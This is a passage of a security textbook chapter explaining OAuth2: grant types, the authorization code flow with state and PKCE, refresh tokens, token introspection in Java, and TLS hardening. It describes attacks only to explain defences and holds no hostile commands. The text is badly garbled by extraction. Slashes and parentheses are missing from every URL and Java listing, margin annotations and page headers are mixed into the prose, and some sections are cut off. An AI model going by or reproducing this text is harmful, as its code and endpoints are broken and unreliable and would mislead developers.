appropriate scopes. The client then presents this grant to the AS’s token endpoint to obtain an access token. OAuth2 supports many dif- ferent authorization grant types to support different kinds of clients:   The Resource Owner Password Credentials  ROPC  grant is the simplest, in which the user supplies their username and password to the client, which then sends them directly to the AS to obtain an access token with any scope it wants. This is almost identical to the token login endpoint you developed in previous chap- ters and is not recommended for third-party clients because the user directly shares their password with the app—the very thing you were trying to avoid!   CAUTION ROPC can be useful for testing but should be avoided in most cases. It may be deprecated in future versions of the standard.   In the Authorization Code grant, the client first uses a web browser to navigate to a dedicated  authorization  endpoint  on  the  AS,  indicating  which  scopes  it  requires. The AS then authenticates the user directly in the browser and asks for consent for the client access. If the user agrees then the AS generates an authorization code and gives it to the client to exchange for an access token at the token end- point. The authorization code grant is covered in more detail in the next section.  The Client Credentials grant allows the client to obtain an access token using its own credentials, with no user involved at all. This grant can be useful in some microservice communications patterns discussed in chapter 11.   There are several additional grant types for more specific situations, such as the device  authorization  grant   also  known  as  device  flow   for  devices  without  any direct means of user interaction. There is no registry of defined grant types, but websites such as https:  oauth.net 2 grant-types  list the most commonly used types. The device authorization grant is covered in chapter 13. OAuth2 grants are extensible, so new grant types can be added when one of the existing grants doesn’t fit.  What about the implicit grant? The original definition of OAuth2 included a variation on the authorization code grant known as the implicit grant. In this grant, the AS returned an access token directly from the authorization endpoint, so that the client didn’t need to call the token end- point to exchange a code. This was allowed because when OAuth2 was standardized in 2012, CORS had not yet been finalized, so a browser-based client such as a single- page app could not make a cross-origin call to the token endpoint. In the implicit grant, the AS redirects back from the authorization endpoint to a URI controlled by   Introducing OAuth2  229  the client, with the access token included in the fragment component of the URI. This introduces some security weaknesses compared to the authorization code grant, as the  access  token  may  be  stolen  by  other  scripts  running  in  the  browser  or  leak through the browser history and other mechanisms. Since CORS is now widely sup- ported by browsers, there is no need to use the implicit grant any longer and the OAuth  Security  Best  Common Practice document  https:  tools.ietf.org html draft- ietf-oauth-security-topics  now advises against its use.  An example of obtaining an access token using the ROPC grant type is as follows, as this  is  the simplest  grant type.  The  client  specifies  the  grant  type   password  in  this case , it’s client ID  for a public client , and the scope it’s requesting as POST param- eters  in  the  application x-www-form-urlencoded  format  used  by  HTML  forms.  It also sends the resource owner’s username and password in the same way. The AS will authenticate the RO using the supplied credentials and, if successful, will return an access  token  in  a  JSON  response.  The  response  also  contains  metadata  about  the token, such as how long it’s valid for  in seconds .  $ curl -d 'grant_type=password&client_id=test    ➥ &scope=read_messages+post_message             ➥ &username=demo&password=changeit'               ➥ https:  as.example.com:8443 oauth2 access_token {   "access_token":"I4d9xuSQABWthy71it8UaRNM2JA",      "scope":"post_message read_messages",   "token_type":"Bearer",   "expires_in":3599}  Specify the grant type,  client ID, and requested  scope as POST form fields.  The RO’s username and  password are also sent  as form fields.  The access token is returned  in a JSON response, along  with its metadata.  7.2.3 Discovering OAuth2 endpoints  The  OAuth2  standards  don’t  define  specific  paths  for  the  token  and  authorization endpoints, so these can vary from AS to AS. As extensions have been added to OAuth, several other endpoints have been added, along with several settings for new features. To avoid each client having to hard-code the locations of these endpoints, there is a standard way to discover these settings using a service discovery document published under a well-known location. Originally developed for the OpenID Connect profile of OAuth   which  is  covered  later  in  this  chapter ,  it  has  been  adopted  by  OAuth2  https:  tools.ietf.org html rfc8414 .   A conforming AS is required to publish a JSON document under the path  .well- known oauth-authorization-server under the root of its web server.5 This JSON docu- ment contains the locations of the token and authorization endpoints and other set- tings. For example, if your AS is hosted as https:   as.example.com:8443, then a GET  5 AS software that supports the OpenID Connect standard may use the path  .well-known openid-configura-  tion instead.

With  the implicit grant now discouraged, the authorization code grant is the preferred way for almost all client types to obtain an access token, including the following:   Server-side clients, such as traditional web applications or other APIs. A server- side application should be a confidential client with credentials to authenticate to the AS.   Client-side JavaScript applications that run in the browser, such as single-page apps. A client-side application is always a public client because it has no secure place to store a client secret.   Mobile,  desktop,  and  command-line  applications.  As  for  client-side  applica- tions,  these  should  be  public  clients,  because  any  secret  embedded  into  the application can be extracted by a user.   The Authorization Code grant  231  In the authorization code grant, the client first redirects the user’s web browser to the authorization endpoint at the AS, as shown in figure 7.5. The client includes its client ID and the scope it’s requesting from the AS in this redirect.

The AS then authenticates the user and asks for  consent to grant access to the application. If approved, then the AS redirects the web browser  to a URI controlled by the client, including an authorization code. The client can then call the  AS token endpoint to exchange the authorization code for an access token to use to access  the API on the user’s behalf.   232  CHAPTER 7 OAuth2 and OpenID Connect  as token are used for the implicit grant . Finally, the client should generate a unique random state value for each request and store it locally  such as in a browser cookie . When the AS redirects back to the client with the authorization code it will include the same state parameter, and the client should check that it matches the original one sent on the request. This ensures that the code received by the client is the one it requested. Otherwise, an attacker may be able to craft a link that calls the client’s redirect endpoint directly with an authorization code obtained by the attacker. This attack is like the Login CSRF attacks discussed in chapter 4, and the state parameter plays  a  similar  role  to  an  anti-CSRF  token  in  that  case.  Finally,  the  client  should include the URI that it wants the AS to redirect to with the authorization code. Typ- ically, the AS will require the client’s redirect URI to be pre-registered to prevent open redirect attacks.  DEFINITION An open redirect vulnerability is when a server can be tricked into redirecting a web browser to a URI under the attacker’s control. This can be used for phishing because it initially looks like the user is going to a trusted site, only to be redirected to the attacker. You should require all redirect URIs to be pre-registered by trusted clients rather than redirecting to any URI pro- vided in a request.  For a web application, this is simply a case of returning an HTTP redirect status code such as 303 See Other,6 with the URI for the authorization endpoint in the Location header, as in the following example:  The client_id parameter indicates the client. HTTP 1.1 303 See Other Location: https:  as.example.com authorize?client_id=test     ➥ &scope=read_messages+post_message                      ➥ &state=t9kWoBWsYjbsNwY0ACJj0A                         ➥ &response_type=code     ➥ &redirect_uri=https:  client.example.net callback      Use the response_type parameter  to obtain an authorization code.  The client’s redirection endpoint  The scope  parameter  indicates the  requested scope.  Include a random  state parameter  to prevent CSRF  attacks.  For mobile and desktop applications, the client should launch the system web browser to carry out the authorization. The latest best practice advice for native applications  https:  tools.ietf.org html rfc8252   recommends  that  the  system  browser  be  used for  this,  rather  than  embedding  an  HTML  view  within  the  application.  This  avoids users having to type their credentials into a UI under the control of a third-party app and allows users to reuse any cookies or other session tokens they may already have in the system browser for the AS to avoid having to login again. Both Android and iOS support using the system browser without leaving the current application, providing a similar user experience to using an embedded web view.  6 The older 302 Found status code is also often used, and there is little difference between them.   The Authorization Code grant  233   Once the user has authenticated in their browser, the AS will typically display a page telling the user which client is requesting access and the scope it requires, such as that shown in figure 7.6. The user is then given an opportunity to accept or decline the request, or possibly to adjust the scope of access that they are willing to grant. If the user approves, then the AS will issue an HTTP redirect to a URI controlled by the client application with the authorization code and the original state value as a query parameter:  HTTP 1.1 303 See Other Location: https:  client.example.net callback?    ➥ code=kdYfMS7H3sOO5y_sKhpdV6NFfik               ➥ &state=t9kWoBWsYjbsNwY0ACJj0A         The AS redirects to  the client with the  authorization code.  It includes the state parameter  from the original request.  Figure 7.6 An example OAuth2 consent page indicating the name of the client requesting  access and the scope it requires. The user can choose to allow or deny the request.  Because the authorization code is included in the query parameters of the redirect, it’s vulnerable to being stolen by malicious scripts running in the browser or leaking in server access logs, browser history, or through the HTTP Referer header. To pro- tect against this, the authorization code is usually only valid for a short period of time and the AS will enforce that it’s used only once. If an attacker tries to use a stolen code after the legitimate client has used it, then the AS will reject the request and revoke any access tokens already issued with that code.   The client can then exchange the authorization code for an access token by calling the token endpoint on the AS. It sends the authorization code in the body of a POST request,  using  the  application x-www-form-urlencoded  encoding  used  for  HTML forms, with the following parameters:   Indicate the authorization code grant type is being used by including  grant_  type=authorization_code.   234  CHAPTER 7 OAuth2 and OpenID Connect   Include the client ID in the client_id parameter or supply client credentials to   Include the redirect URI that was used in the original request in the redirect  identify the client.  _uri parameter.   Finally, include the authorization code as the value of the code parameter.  This is a direct HTTPS call from the client to the AS rather than a redirect in the web browser, and so the access token returned to the client is protected against theft or tampering. An example request to the token endpoint looks like the following:  POST  token HTTP 1.1 Host: as.example.com Content-Type: application x-www-form-urlencoded Authorization: Basic dGVzdDpwYXNzd29yZA==       Supply client credentials  for a confidential client.  grant_type=authorization_code&          code=kdYfMS7H3sOO5y_sKhpdV6NFfik&       redirect_uri=https:  client.example.net callback       Include the grant type  and authorization code.  Provide the redirect URI that was used in the original request.  If the authorization code is valid and has not expired, then the AS will respond with the  access  token  in  a  JSON  response,  along  with  some   optional   details  about  the scope and expiry time of the token:  HTTP 1.1 200 OK Content-Type: application json  {   "access_token":"QdT8POxT2SReqKNtcRDicEgIgkk",      "scope":"post_message read_messages",          "token_type":"Bearer",   "expires_in":3599}      The number of seconds until  the access token expires  The access token  The scope of the access  token, which may be  different than requested  If the client is confidential, then it must authenticate to the token endpoint when it exchanges the authorization code. In the most common case, this is done by includ- ing  the  client  ID  and  client  secret  as  a  username  and  password  using  HTTP  Basic authentication,  but alternative  authentication methods  are allowed, such  as  using  a JWT or TLS client certificate. Authenticating to the token endpoint prevents a mali- cious client from using a stolen authorization code to obtain an access token.   Once the client has obtained an access token, it can use it to access the APIs on the resource  server  by  including  it  in  an  Authorization:  Bearer  header  just  as  you’ve done in previous chapters. You’ll see how to validate an access token in your API in section 7.4.   The Authorization Code grant  235  7.3.1 Redirect URIs for different types of clients  The  choice  of  redirect  URI  is  an  important  security  consideration  for  a  client.  For public clients that don’t authenticate to the AS, the redirect URI is the only measure by which the AS can be assured that the authorization code is sent to the right client. If the redirect URI is vulnerable to interception, then an attacker may steal authoriza- tion codes.   For a traditional web application, it’s simple to create a dedicated endpoint to use for the redirect URI to receive the authorization code. For a single-page app, the redi- rect  URI  should  be  the  URI  of  the  app  from  which  client-side  JavaScript  can  then extract the authorization code and make a CORS request to the token endpoint.   For mobile applications, there are two primary options:   The application can register a private-use URI scheme with the mobile operat- ing  system,  such  as  myapp:   callback.  When  the  AS  redirects  to  myapp:    callback?code=… in the system web browser, the operating system will launch the  native  app  and  pass  it  the  callback  URI.  The  native  application  can  then extract the authorization code from this URI and call the token endpoint.   An alternative is to register a portion of the path on the web domain of the app producer. For example, your app could register with the operating system that it  will  handle  all  requests  to  https:   example.com app callback.  When  the AS redirects to this HTTPS endpoint, the mobile operating system will launch the native app just as for a private-use URI scheme. Android calls this an App Link  https:  developer.android.com training app-links  , while on iOS they are known as Universal Links  https:  developer.apple.com ios universal-links  .  A drawback with private-use URI schemes is that any app can register to handle any URI scheme, so a malicious application could register the same scheme as your legiti- mate client. If a user has the malicious application installed, then the redirect from the AS with an authorization code may cause the malicious application to be activated rather than your legitimate application. Registered HTTPS redirect URIs on Android  App Links  and iOS  Universal Links  avoid this problem because an app can only claim part of the address space of a website if the website in question publishes a JSON document explicitly granting permission to that app. For example, to allow your iOS app to handle requests to https:   example.com app callback, you would publish the following JSON file to https:   example.com .well-known apple-app-site-association:  {   "applinks": { "apps": [], "details": [   { "appID": "9JA89QQLNQ.com.example.myapp",        "paths": [" app callback"] }]     } }  The ID of your app in  the Apple App Store  The paths on the  server that the app  can intercept   236  CHAPTER 7 OAuth2 and OpenID Connect  7.3.2 Hardening code exchange with PKCE  The process is similar for Android apps. This prevents a malicious app from claiming the  same  redirect  URI,  which  is  why  HTTPS  redirects  are  recommended  by  the OAuth Native Application Best Common Practice document  https:  tools.ietf.org  html rfc8252section-7.2 .   For desktop and command-line applications, both Mac OS X and Windows sup- port registering private-use URI schemes but not claimed HTTPS URIs at the time of writing. For non-native apps and scripts that cannot register a private URI scheme, the recommendation is that the application starts a temporary web server listening on the local loopback device  that is, http:   127.0.0.1  on a random port, and uses that as its redirect URI. Once the authorization code is received from the AS, the client can shut down the temporary web server.  Before  the  invention  of  claimed  HTTPS  redirect  URIs,  mobile  applications  using private-use URI schemes were vulnerable to code interception by a malicious app reg- istering the same URI scheme, as described in the previous section. To protect against this attack, the OAuth working group developed the PKCE standard  Proof Key for Code Exchange; https:  tools.ietf.org html rfc7636 , pronounced “pixy.” Since then, formal analysis of the OAuth protocol has identified a few theoretical attacks against the authorization code flow. For example, an attacker may be able to obtain a genuine authorization  code  by  interacting  with  a  legitimate  client  and  then  using  an  XSS attack against a victim to replace their authorization code with the attacker’s. Such an attack would be quite difficult to pull off but is theoretically possible. It’s there- fore recommended that all types of clients use PKCE to strengthen the authoriza- tion code flow.   The way PKCE works for a client is quite simple. Before the client redirects the user to the authorization endpoint, it generates another random value, known as the PKCE code verifier. This value should be generated with high entropy, such as a 32-byte value  from  a  SecureRandom  object  in  Java;  the  PKCE  standard  requires  that  the encoded value is at least 43 characters long and a maximum of 128 characters from a restricted set of characters. The client stores the code verifier locally, alongside the state  parameter.  Rather  than  sending  this  value  directly  to  the  AS,  the  client  first hashes7  it  using  the  SHA-256  cryptographic  hash  function  to  create  a  code  challenge  listing  7.4 .  The  client  then  adds  the  code  challenge  as  another  query  parameter when redirecting to the authorization endpoint.           secure.  7 There is an alternative method in which the client sends the original verifier as the challenge, but this is less   The Authorization Code grant  237  Listing 7.4 Computing a PKCE code challenge  String addPkceChallenge spark.Request request,         String authorizeRequest  throws Exception {  Store the verifier in a session cookie or other local storage.  Create a code challenge as the SHA-256 hash of the code verifier string.      var secureRandom = new java.security.SecureRandom  ;     var encoder = java.util.Base64.getUrlEncoder  .withoutPadding  ;      var verifierBytes = new byte[32];                           secureRandom.nextBytes verifierBytes ;                      var verifier = encoder.encodeToString verifierBytes ;    Create a  random code  verifier string.      request.session true .attribute "verifier", verifier ;           var sha256 = java.security.MessageDigest.getInstance "SHA-256" ;       var challenge = encoder.encodeToString                                         sha256.digest verifier.getBytes "UTF-8"   ;                    return authorizeRequest +           "&code_challenge=" + challenge +           "&code_challenge_method=S256";          }  Include the code challenge  in the redirect to the AS  authorization endpoint.  Later,  when  the  client  exchanges  the  authorization  code  at  the  token  endpoint,  it sends the original  unhashed  code verifier in the request. The AS will check that the SHA-256 hash of the code verifier matches the code challenge that it received in the authorization request. If they differ, then it rejects the request. PKCE is very secure, because  even  if  an  attacker  intercepts  both  the  redirect  to  the  AS  and  the  redirect back with the authorization code, they are not able to use the code because they can- not compute the correct code verifier. Many OAuth2 client libraries will automatically compute PKCE code verifiers and challenges for you, and it significantly improves the security  of  the  authorization  code  grant  so  you  should  always  use  it  when  possible. Authorization  servers  that  don’t  support  PKCE  should  ignore  the  additional  query parameters, because this is required by the OAuth2 standard.  7.3.3 Refresh tokens  In addition to an access token, the AS may also issue the client with a refresh token at the same time. The refresh token is returned as another field in the JSON response from the token endpoint, as in the following example:  $ curl -d 'grant_type=password ➥ &scope=read_messages+post_message ➥ &username=demo&password=changeit'  ➥  -u test:password ➥ https:  as.example.com:8443 oauth2 access_token {   "access_token":"B9KbdZYwajmgVxr65SzL-z2Dt-4",   "refresh_token":"sBac5bgCLCjWmtjQ8Weji2mCrbI",      "scope":"post_message read_messages",   "token_type":"Bearer","expires_in":3599}  A refresh  token   238  CHAPTER 7 OAuth2 and OpenID Connect  When the access token expires, the client can then use the refresh token to obtain a fresh access token from the AS without the resource owner needing to approve the request again. Because the refresh token is sent only over a secure channel between the client and the AS, it’s considered more secure than an access token that might be sent to many different APIs.  DEFINITION A client can use a refresh token to obtain a fresh access token when the original one expires. This allows an AS to issue short-lived access tokens without clients having to ask the user for a new token every time it expires.  By issuing a refresh token, the AS can limit the lifetime of access tokens. This has a minor security benefit because if an access token is stolen, then it can only be used for a short period of time. But in practice, a lot of damage could be done even in a short space of time by an automated attack, such as the Facebook attack discussed in chap- ter 6  https:  newsroom.fb.com news 2018 09 security-update  . The primary ben- efit of refresh tokens is to allow the use of stateless access tokens such as JWTs. If the access token is short-lived, then the client is forced to periodically refresh the token at the AS, providing an opportunity for the token to be revoked without the AS main- taining a large blocklist. The complexity of revocation is effectively pushed to the cli- ent, which must now handle periodically refreshing its access tokens.   To refresh an access token, the client calls the AS token endpoint passing in the refresh token, using the refresh token grant, and sending the refresh token and any cli- ent credentials, as in the following example:  $ curl -d 'grant_type=refresh_token               ➥ &refresh_token=sBac5bgCLCjWmtjQ8Weji2mCrbI'    ➥ -u test:password                                  ➥ https:  as.example.com:8443 oauth2 access_token {   "access_token":"snGxj86QSYB7Zojt3G1b2aXN5UM",       "scope":"post_message read_messages",   "token_type":"Bearer","expires_in":3599}  Use the refresh token  grant and supply the  refresh token.  Include client  credentials if using a  confidential client.  The AS returns a  fresh access token.  The AS can often be configured to issue a new refresh token at the same time  revok- ing  the  old  one ,  enforcing  that  each refresh  token is used  only  once. This can be used to detect refresh token theft: when the attacker uses the refresh token, it will stop working for the legitimate client.

The answers are at the end of the chapter.  7.4  Validating an access token Now  that  you’ve  learned  how  to  obtain  an  access  token  for  a  client,  you  need  to learn how to validate the token in your API. In previous chapters, it was simple to look up a token in the local token database. For OAuth2, this is no longer quite so simple when tokens are issued by the AS and not by the API. Although you could share a token database between the AS and each API, this is not desirable because sharing database access increases the risk of compromise. An attacker can try to access the database through any of the connected systems, increasing the attack surface. If just one  API  connected  to  the  database  has  a  SQL  injection  vulnerability,  this  would compromise the security of all.   Originally, OAuth2 didn’t provide a solution to this problem and left it up to the AS and resource servers to decide how to coordinate to validate tokens. This changed with the publication of the OAuth2 Token Introspection standard  https:  tools.ietf .org html rfc7662  in 2015, which describes a standard HTTP endpoint on the AS that the RS can call to validate an access token and retrieve details about its scope and resource  owner.  Another  popular  solution  is  to  use  JWTs  as  the  format  for  access tokens, allowing the RS to locally validate the token and extract required details from the embedded JSON claims. You’ll learn how to use both mechanisms in this section.  7.4.1  Token introspection  To  validate  an  access  token  using  token  introspection,  you  simply  make  a  POST request to the introspection endpoint of the AS, passing in the access token as a param- eter. You can discover the introspection endpoint using the method in section 7.2.3 if the AS supports discovery. The AS will usually require your API  acting as the resource server  to register as a special kind of client and receive client credentials to call the endpoint. The examples in this section will assume that the AS requires HTTP Basic authentication because this is the most common requirement, but you should check the documentation for your AS to determine how the RS must authenticate.  TIP To avoid historical issues with ambiguous character sets, OAuth requires that HTTP Basic authentication credentials are first URL-encoded  as UTF-8  before being Base64-encoded.  Listing  7.5  shows  the  constructor  and  imports  for  a  new  token  store  that  will  use OAuth2 token introspection to validate an access token. You’ll implement the remain- ing  methods  in  the  rest  of  this  section.  The  create  and  revoke  methods  throw  an exception, effectively disabling the login and logout endpoints at the API, forcing   240  CHAPTER 7 OAuth2 and OpenID Connect  clients to obtain access tokens from the AS. The new store takes the URI of the token introspection endpoint, along with the credentials to use to authenticate. The creden- tials are encoded into an HTTP Basic authentication header ready to be used.

Validating an access token  241  To validate a token, you then need to make a POST request to the introspection end- point passing the token. You can use the HTTP client library in java.net.http, which was  added  in  Java  11   for  earlier  versions,  you  can  use  Apache  HttpComponents, https:  hc.apache.org httpcomponents-client-ga  .  Because  the  token  is  untrusted before the call, you should first validate it to ensure that it conforms to the allowed syntax for access tokens. As you learned in chapter 2, it’s important to always validate all inputs, and this is especially important when the input will be included in a call to another system. The standard doesn’t specify a maximum size for access tokens, but you should enforce a limit of around 1KB or less, which should be enough for most token formats  if the access token is a JWT, it could get quite large and you may need to  increase  that  limit .  The  token  should  then  be  URL-encoded  to  include  in  the POST  body  as  the  token  parameter.  It’s  important  to  properly  encode  parameters when calling another system to prevent an attacker being able to manipulate the con- tent  of  the  request   see  section  2.6  of  chapter  2 .  You  can  also  include  a  token_ type_hint parameter to indicate that it’s an access token, but this is optional.  TIP To avoid making an HTTP call every time a client uses an access token with your API, you can cache the response for a short period of time, indexed by the token. The longer you cache the response, the longer it may take your API to find out that a token has been revoked, so you should balance perfor- mance against security based on your threat model.  If the introspection call is successful, the AS will return a JSON response indicating whether the token is valid and metadata about the token, such as the resource owner and scope. The only required field in this response is a Boolean active field, which indicates whether the token should be considered valid. If this is false then the token should  be  rejected,  as  in  listing  7.6.  You’ll  process  the  rest  of  the  JSON  response shortly, but for now open OAuth2TokenStore.java in your editor again and add the implementation of the read method from the listing.  Listing 7.6 Introspecting an access token  @Override public Optional  read Request request, String tokenId  {     if  !tokenId.matches "[\\x20-\\x7E]{1,1024}"   {                return Optional.empty  ;     }      var form = "token=" + URLEncoder.encode tokenId, UTF_8  +                "&token_type_hint=access_token";                      Validate the  token first.  Encode the  token into the  POST form body.      var httpRequest = HttpRequest.newBuilder               .uri introspectionEndpoint              .header "Content-Type", "application x-www-form-urlencoded"              .header "Authorization", authorization                   .POST BodyPublishers.ofString form               .build  ;  Call the introspection  endpoint using your  client credentials.   242  CHAPTER 7 OAuth2 and OpenID Connect      try {         var httpResponse = httpClient.send httpRequest,                 BodyHandlers.ofString   ;          if  httpResponse.statusCode   == 200  {             var json = new JSONObject httpResponse.body   ;  Check that the  token is still active.              if  json.getBoolean "active"   {                      return processResponse json ;                 }         }     } catch  IOException e  {         throw new RuntimeException e ;     } catch  InterruptedException e  {         Thread.currentThread  .interrupt  ;         throw new RuntimeException e ;     }      return Optional.empty  ; }  Several  optional  fields  are  allowed  in  the  JSON  response,  including  all  valid  JWT claims  see chapter 6 . The most important fields are listed in table 7.1. Because all these fields are optional, you should be prepared for them to be missing. This is an unfortunate aspect of the specification, because there is often no alternative but to reject a token if its scope or resource owner cannot be established. Thankfully, most AS software generates sensible values for these fields.  Table 7.1 Token introspection response fields  Description  The scope of the token as a string. If multiple scopes are specified then they are sepa- rated by spaces, such as "read_messages post_message".  An identifier for the resource owner  subject  of the token. This is a unique identifier,  not necessarily human-readable.  username  A human-readable username for the resource owner.  client_id  The ID of the client that requested the token.  exp  The expiry time of the token, in seconds from the UNIX epoch.  Listing 7.7 shows how to process the remaining JSON fields by extracting the resource owner from the sub field, the expiry time from the exp field, and the scope from the scope field. You can also extract other fields of interest, such as the client_id, which can be useful information to add to audit logs. Open OAuth2TokenStore.java again and add the processResponse method from the listing.

The authenticated subject of a token needs to match the entries in the users and permissions tables in the database that define the access control lists for Natter  social  spaces.  If  these  don’t  match,  then  the  requests  from  a  client  will  be denied even if they have a valid access token. You should check the documentation for your AS to see which field to use to match your existing user IDs.   You can now switch the Natter API to use OAuth2 access tokens by changing the TokenStore  in  Main.java  to  use  the  OAuth2TokenStore,  passing  in  the  URI  of  your AS’s token introspection endpoint and the client ID and secret that you registered for the Natter API  see appendix A for instructions :  var introspectionEndpoint =      URI.create "https:  as.example.com:8443 oauth2 introspect" ; SecureTokenStore tokenStore = new OAuth2TokenStore             introspectionEndpoint, clientId, clientSecret ;      var tokenController = new TokenController tokenStore ;  Construct the token  store, pointing at  your AS.  You should make sure that the AS and the API have the same users and that the AS communicates the username to the API in the sub or username fields from the intro- spection  response.  Otherwise,  the  API  may  not  be  able  to  match  the  username returned from token introspection to entries in its access control lists  chapter 3 . In many  corporate  environments,  the  users  will  not  be  stored  in  a  local  database  but instead in a shared LDAP directory that is maintained by a company’s IT department that both the AS and the API have access to, as shown in figure 7.7.    In other cases, the AS and the API may have different user databases that use dif- ferent username formats. In this case, the API will need some logic to map the user- name returned by token introspection into a username that matches its local database and  ACLs.  For  example,  if  the  AS  returns  the  email  address  of  the  user,  then  this could be used to search for a matching user in the local user database. In more loosely coupled  architectures,  the  API  may  rely  entirely  on  the  information  returned  from the token introspection endpoint and not have access to a user database at all.   244  CHAPTER 7 OAuth2 and OpenID Connect  Authorization server  In a corporate environment, the AS and the API may both have access to a shared LDAP user directory.  Token  introspection  "sub":"alice"  LDAP user  directory  API  user=alice,name=Alice,address=...  The username communicated in token introspection must match the LDAP username and entries in the API’s ACL.  Access control  list  user=alice, permissions=rw  Figure 7.7 In many environments, the AS and the API will both have access  to a corporate LDAP directory containing details of all users. In this case,  the AS needs to communicate the username to the API so that it can find  the matching user entry in LDAP and in its own access control lists.  Once the AS and the API are on the same page about usernames, you can obtain an access token from the AS and use it to access the Natter API, as in the following exam- ple using the ROPC grant:  $ curl -u test:password \                                      -d 'grant_type=password&scope=create_space+post_message    ➥ &username=demo&password=changeit' \                       https:  openam.example.com:8443 openam oauth2 access_token {"access_token":"_Avja0SO-6vAz-caub31eh5RLDU",  "scope":"post_message create_space",   "token_type":"Bearer","expires_in":3599} $ curl -H 'Content-Type: application json' \  -H 'Authorization: Bearer _Avja0SO-6vAz-caub31eh5RLDU' \     -d '{"name":"test","owner":"demo"}' https:  localhost:4567 spaces {"name":"test","uri":" spaces 1"}  Obtain an access  token using ROPC  grant.  Use the access  token to perform  actions with the  Natter API.  Attempting to perform an action that is not allowed by the scope of the access token will result in a 403 Forbidden error due to the access control filters you added at the start of this chapter:  $ curl -i -H 'Authorization: Bearer _Avja0SO-6vAz-caub31eh5RLDU' \   https:  localhost:4567 spaces 1 messages HTTP 1.1 403 Forbidden                    The request is forbidden.

While this connection should always be over HTTPS, the default connection settings used by Java are not as secure as they could be:   The  default  settings  trust  server  certificates  signed  by  any  of  the  main  public certificate  authorities   CAs .  Typically,  the  AS  will  be  running  on  your  own internal network and issued with a certificate by a private CA for your organiza- tion, so it’s unnecessary to trust all of these public CAs.   The default TLS settings include a wide variety of cipher suites and protocol ver- sions  for  maximum  compatibility.  Older  versions  of  TLS,  and  some  cipher suites, have known security weaknesses that should be avoided where possible. You  should  disable  these  less  secure  options  and  re-enable  them  only  if  you must talk to an old server that cannot be upgraded.  TLS cipher suites A TLS cipher suite is a collection of cryptographic algorithms that work together to cre- ate the secure channel between a client and a server. When a TLS connection is first established, the client and server perform a handshake, in which the server authen- ticates to the client, the client optionally authenticates to the server, and they agree upon a session key to use for subsequent messages. The cipher suite specifies the algorithms to be used for authentication, key exchange, and the block cipher and mode of operation to use for encrypting messages. The cipher suite to use is nego- tiated as the first part of the handshake.  For example, the TLS 1.2 cipher suite TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 specifies that the two parties will use the Elliptic Curve Diffie-Hellman  ECDH  key agreement algorithm  using ephemeral keys, indicated by the final E , with RSA sig- natures for authentication, and the agreed session key will be used to encrypt mes- sages  using  AES  in  Galois Counter  Mode.   SHA-256  is  used  as  part  of  the  key agreement.   In TLS 1.3, cipher suites only specify the block cipher and hash function used, such as  TLS_AES_128_GCM_SHA256. The key exchange and authentication algorithms are negotiated separately.  The latest and most secure version of TLS is version 1.3, which was released in August 2018. This replaced TLS 1.2, released exactly a decade earlier. While TLS 1.3 is a sig- nificant  improvement  over  earlier  versions  of  the  protocol,  it’s  not  yet  so  widely adopted that support for TLS 1.2 can be dropped completely. TLS 1.2 is still a very   246  CHAPTER 7 OAuth2 and OpenID Connect  secure protocol, but for maximum security you should prefer cipher suites that offer forward secrecy and avoid older algorithms that use AES in CBC mode, because these are more prone to attacks. Mozilla provides recommendations for secure TLS configu- ration options  https:  wiki.mozilla.org Security Server_Side_TLS , along with a tool for automatically generating configuration files for various web servers, load balanc- ers, and reverse proxies. The configuration used in this section is based on Mozilla’s Intermediate settings. If you know that your AS software is capable of TLS 1.3, then you could opt for the Modern settings and remove the TLS 1.2 support.  DEFINITION A cipher suite offers forward secrecy if the confidentiality of data transmitted using that cipher suite is protected even if one or both of the par- ties are compromised afterwards. All cipher suites provide forward secrecy in TLS 1.3. In TLS 1.2, these cipher suites start with TLS_ECDHE_ or TLS_DHE_.   To configure the connection to trust only the CA that issued the server certificate used by your AS, you need to create a javax.net.ssl.TrustManager that has been initial- ized with a KeyStore that contains only that one CA certificate. For example, if you’re using the mkcert utility from chapter 3 to generate the certificate for your AS, then you can use the following command to import the root CA certificate into a keystore:  $ keytool -import -keystore as.example.com.ca.p12 \     -alias ca -file "$ mkcert -CAROOT  rootCA.pem"  This will ask you whether you want to trust the root CA certificate and then ask you for a password for the new keystore. Accept the certificate and type in a suitable password, then copy the generated keystore into the Natter project root directory.  Certificate chains When configuring the trust store for your HTTPS client, you could choose to directly trust the server certificate for that server. Although this seems more secure, it means that whenever the server changes its certificate, the client would need to be updated to trust the new one. Many server certificates are valid for only 90 days. If the server is ever compromised, then the client will continue trusting the compromised certifi- cate until it’s manually updated to remove it from the trust store.  To avoid these problems, the server certificate is signed by a CA, which itself has a  self-signed  certificate. When a client connects to the server it receives the server’s current certificate during the handshake. To verify this certificate is genuine, it looks up the corresponding CA certificate in the client trust store and checks that the server certificate was signed by that CA and is not expired or revoked.   In practice, the server certificate is often not signed directly by the CA. Instead, the CA signs certificates for one or more intermediate CAs, which then sign server certif- icates. The client may therefore have to verify a chain of certificates until it finds a certificate of a root CA that it trusts directly. Because CA certificates might them- selves be revoked or expire, in general the client may have to consider multiple possible   Validating an access token  247  certificate chains before it finds a valid one. Verifying a certificate chain is complex and error-prone with many subtle details so you should always use a mature library to do this.  In Java, overall TLS settings can be configured explicitly using the javax.net.ssl.SSL- Parameters class8  listing 7.8 . First construct a new instance of the class, and then use the setter methods such as setCipherSuites String[] that allows TLS versions and cipher suites. The configured parameters can then be passed when building the HttpClient object. Open OAuth2TokenStore.java in your editor and update the con- structor to configure secure TLS settings.

CHAPTER 7 OAuth2 and OpenID Connect  } catch  GeneralSecurityException  IOException e  {     throw new RuntimeException e ; }  248  7.4.3  Token revocation Just as for token introspection, there is  an OAuth2 standard for revoking an access token  https:  tools.ietf.org html rfc7009 . While this could be used to implement the revoke method in the OAuth2TokenStore, the standard only allows the client that was issued a token to revoke it, so the RS  the Natter API in this case  cannot revoke a token on behalf of a client. Clients should directly call the AS to revoke a token, just as they do to get an access token in the first place.   Revoking a token follows the same pattern as token introspection: the client makes a POST request to a revocation endpoint at the AS, passing in the token in the request body, as shown in listing 7.9. The client should include its client credentials to authen- ticate the request. Only an HTTP status code is returned, so there is no need to parse the response body.

